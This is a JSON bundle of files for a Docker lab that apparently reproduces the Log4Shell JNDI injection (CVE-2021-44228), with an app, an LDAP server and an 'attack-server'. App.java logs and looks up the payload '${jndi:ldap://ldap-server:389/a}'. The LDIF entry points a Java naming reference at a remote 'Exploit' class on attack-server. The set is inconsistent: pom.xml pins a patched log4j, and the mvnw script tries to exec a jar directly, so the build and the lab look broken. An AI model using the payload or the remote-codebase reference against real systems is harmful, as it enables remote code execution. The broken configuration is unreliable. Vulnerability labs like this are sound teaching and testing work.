{
    "files": [
        {
            "location": "./../../dockers/CVE-2021-44228/custom/docker-compose.yml",
            "content": "services:\n  vulnerable-app:\n    build: ./app\n    ports:\n      - \"8080:8080\"\n\n  ldap-server:\n    image: osixia/openldap:1.5.0\n    command: --copy-service\n    environment:\n      LDAP_ORGANISATION: \"Example\"\n      LDAP_DOMAIN: \"example.org\"\n      LDAP_ADMIN_PASSWORD: \"admin\"\n    ports:\n      - \"389:389\"\n    volumes:\n      - ./ldap/ldif:/container/service/slapd/assets/config/bootstrap/ldif/custom\n\n  attack-server:\n    image: alpine\n    command: [\"/bin/sh\", \"-c\", \"while true; do sleep 1000; done\"]\n    volumes:\n      - ./attack:/attack\n    depends_on:\n      - vulnerable-app\n      - ldap-server\n"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/app/Dockerfile",
            "content": "FROM openjdk:8-jdk\n\nWORKDIR /app\n\nCOPY .mvn .mvn\nCOPY mvnw mvnw\nCOPY mvnw.cmd mvnw.cmd\nCOPY pom.xml pom.xml\nCOPY src src\n\nRUN chmod +x mvnw\n\n# Set the Maven project base directory explicitly\nENV MAVEN_PROJECTBASEDIR=/app\n\nRUN ./mvnw clean package\n\nCMD [\"java\", \"-jar\", \"target/vulnerable-app.jar\"]"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/app/pom.xml",
            "content": "<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>org.example</groupId>\n    <artifactId>vulnerable-app</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <maven.compiler.source>1.8</maven.compiler.source>\n        <maven.compiler.target>1.8</maven.compiler.target>\n    </properties>\n\n    <dependencies>\n        <dependency>\n            <groupId>org.apache.logging.log4j</groupId>\n            <artifactId>log4j-core</artifactId>\n            <version>2.17.1</version> <!-- Updated to a non-vulnerable version -->\n        </dependency>\n    </dependencies>\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-compiler-plugin</artifactId>\n                <version>3.8.1</version>\n            </plugin>\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-assembly-plugin</artifactId>\n                <version>3.3.0</version>\n                <configuration>\n                    <archive>\n                        <manifest>\n                            <mainClass>org.example.App</mainClass>\n                        </manifest>\n                    </archive>\n                    <descriptorRefs>\n                        <descriptorRef>jar-with-dependencies</descriptorRef>\n                    </descriptorRefs>\n                </configuration>\n                <executions>\n                    <execution>\n                        <id>make-assembly</id>\n                        <phase>package</phase>\n                        <goals>\n                            <goal>single</goal>\n                        </goals>\n                    </execution>\n                </executions>\n            </plugin>\n        </plugins>\n    </build>\n\n</project>"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/app/src/main/java/org/example/App.java",
            "content": "package org.example;\n\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\n\npublic class App {\n    private static final Logger logger = LogManager.getLogger(App.class);\n\n    public static void main(String[] args) {\n        String userInput = \"${jndi:ldap://ldap-server:389/a}\"; // This simulates user-controlled input\n        logger.error(\"User input: \" + userInput);\n\n        try {\n            InitialContext context = new InitialContext();\n            context.lookup(userInput);\n        } catch (NamingException e) {\n            logger.error(\"Naming exception occurred\", e);\n        }\n    }\n}\n"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/app/mvnw",
            "content": "#!/bin/sh\n\n# ----------------------------------------------------------------------------\n# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\n# ----------------------------------------------------------------------------\n\n# ----------------------------------------------------------------------------\n# Maven Start Up Batch script\n#\n# Required ENV vars:\n#\n#   JAVA_HOME - location of a JDK home dir\n#\n# Optional ENV vars\n#\n#   M2_HOME - location of maven2's installed home dir\n#   MAVEN_OPTS - parameters passed to the Java VM when running Maven\n#     e.g. to debug Maven itself, use\n#       set MAVEN_OPTS=-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8000\n#   MAVEN_SKIP_RC - flag to disable loading of mavenrc files\n# ----------------------------------------------------------------------------\n\nif [ -z \"$MAVEN_SKIP_RC\" ] ; then\n  if [ -f /etc/mavenrc ] ; then\n    . /etc/mavenrc\n  fi\n  if [ -f \"$HOME/.mavenrc\" ] ; then\n    . \"$HOME/.mavenrc\"\n  fi\nfi\n\nMAVEN_PROJECTBASEDIR=\"${MAVEN_BASEDIR:-}\" # this is a poor man's solution for MNG-5600\n\nif [ -z \"$MAVEN_PROJECTBASEDIR\" ] ; then\n  if [ -f \"./.mvn/maven.config\" ] ; then\n    MAVEN_PROJECTBASEDIR=\"$(pwd)\"\n  fi\nfi\n\nif [ -z \"$MAVEN_PROJECTBASEDIR\" ] ; then\n  if [ -d \"/.mvn\" ] ; then\n    MAVEN_PROJECTBASEDIR=\"/\"\n  fi\nfi\n\nif [ -z \"$MAVEN_PROJECTBASEDIR\" ] ; then\n  if [ -d \"$HOME/.m2\" ] ; then\n    MAVEN_PROJECTBASEDIR=\"$HOME\"\n  fi\nfi\n\nif [ -z \"$MAVEN_PROJECTBASEDIR\" ] ; then\n  echo \"Could not determine Maven project base directory.\"\n  exit 1\nfi\n\nexec \"$MAVEN_PROJECTBASEDIR/.mvn/wrapper/maven-wrapper.jar\" \"$@\"\n"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/app/mvnw.cmd",
            "content": "@echo off\n\nrem ----------------------------------------------------------------------------\nrem Licensed to the Apache Software Foundation (ASF) under one\nrem or more contributor license agreements.  See the NOTICE file\nrem distributed with this work for additional information\nrem regarding copyright ownership.  The ASF licenses this file\nrem to you under the Apache License, Version 2.0 (the\nrem \"License\"); you may not use this file except in compliance\nrem with the License.  You may obtain a copy of the License at\nrem\nrem   http://www.apache.org/licenses/LICENSE-2.0\nrem\nrem Unless required by applicable law or agreed to in writing,\nrem software distributed under the License is distributed on an\nrem \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\nrem KIND, either express or implied.  See the License for the\nrem specific language governing permissions and limitations\nrem under the License.\nrem ----------------------------------------------------------------------------\n\n@REM ----------------------------------------------------------------------------\n@REM Maven Start Up Batch script\n@REM\n@REM Required ENV vars:\n@REM\n@REM   JAVA_HOME - location of a JDK home dir\n@REM\n@REM Optional ENV vars\n@REM\n@REM   M2_HOME - location of maven2's installed home dir\n@REM   MAVEN_OPTS - parameters passed to the Java VM when running Maven\n@REM     e.g. to debug Maven itself, use\n@REM       set MAVEN_OPTS=-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8000\n@REM   MAVEN_SKIP_RC - flag to disable loading of mavenrc files\n@REM ----------------------------------------------------------------------------\n\nif not \"%MAVEN_SKIP_RC%\"==\"\" goto skipRc\nif exist \"%HOME%\\.mavenrc\" call \"%HOME%\\.mavenrc\"\nif exist \"C:\\ProgramData\\mavenrc_pre.bat\" call \"C:\\ProgramData\\mavenrc_pre.bat\"\nif exist \"C:\\ProgramData\\mavenrc.bat\" call \"C:\\ProgramData\\mavenrc.bat\"\n:skipRc\n\nsetlocal\n\nset MAVEN_PROJECTBASEDIR=%MAVEN_BASEDIR%\n\nif \"%MAVEN_PROJECTBASEDIR%\"==\"\" (\n  if exist .\\.mvn\\maven.config (\n    set MAVEN_PROJECTBASEDIR=%CD%\n  )\n)\n\nif \"%MAVEN_PROJECTBASEDIR%\"==\"\" (\n  if exist \".mvn\" (\n    set MAVEN_PROJECTBASEDIR=\\\n  )\n)\n\nif \"%MAVEN_PROJECTBASEDIR%\"==\"\" (\n  if exist \"%HOME%\\.m2\" (\n    set MAVEN_PROJECTBASEDIR=%HOME%\n  )\n)\n\nif \"%MAVEN_PROJECTBASEDIR%\"==\"\" (\n  echo Could not determine Maven project base directory.\n  exit /b 1\n)\n\njava -jar \"%MAVEN_PROJECTBASEDIR%\\.mvn\\wrapper\\maven-wrapper.jar\" %*\n"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/app/.mvn/wrapper/maven-wrapper.jar",
            "content": "(binary content not shown here)"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/app/.mvn/wrapper/maven-wrapper.properties",
            "content": "distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/3.8.4/apache-maven-3.8.4-bin.zip\nwrapperUrl=https://repo.maven.apache.org/maven2/org/apache/maven/wrapper/maven-wrapper/0.5.6/maven-wrapper-0.5.6.jar\n"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/ldap/ldif/50-bootstrap.ldif",
            "content": "dn: dc=example,dc=org\nobjectClass: dcObject\nobjectClass: organization\no: Example\ndc: example\n\n# admin user\ndn: cn=admin,dc=example,dc=org\nobjectClass: simpleSecurityObject\nobjectClass: organizationalRole\ncn: admin\nuserPassword: admin\n\n# entry for JNDI lookup\n# this can be used to simulate JNDI injection\ndn: cn=javaObject,dc=example,dc=org\nobjectClass: javaObject\nobjectClass: javaNamingReference\ncn: javaObject\njavaClassName: com.example.Exploit\njavaCodebase: http://attack-server:8000/\njavaFactory: Exploit\n"
        }
    ],
    "directory_tree": "CVE-2021-44228/\n\u251c\u2500\u2500 custom/\n\u2502   \u251c\u2500\u2500 app/\n\u2502   \u2502   \u251c\u2500\u2500 Dockerfile\n\u2502   \u2502   \u251c\u2500\u2500 pom.xml\n\u2502   \u2502   \u251c\u2500\u2500 src/\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 main/\n\u2502   \u2502   \u2502       \u2514\u2500\u2500 java/\n\u2502   \u2502   \u2502           \u2514\u2500\u2500 org/\n\u2502   \u2502   \u2502               \u2514\u2500\u2500 example/\n\u2502   \u2502   \u2502                   \u2514\u2500\u2500 App.java\n\u2502   \u2502   \u251c\u2500\u2500 mvnw\n\u2502   \u2502   \u251c\u2500\u2500 mvnw.cmd\n\u2502   \u2502   \u251c\u2500\u2500 .mvn/\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 wrapper/\n\u2502   \u2502   \u2502       \u251c\u2500\u2500 maven-wrapper.jar\n\u2502   \u2502   \u2502       \u2514\u2500\u2500 maven-wrapper.properties\n\u2502   \u251c\u2500\u2500 docker-compose.yml\n\u2502   \u2514\u2500\u2500 ldap/\n\u2502       \u2514\u2500\u2500 ldif/\n\u2502           \u2514\u2500\u2500 50-bootstrap.ldif\n"
}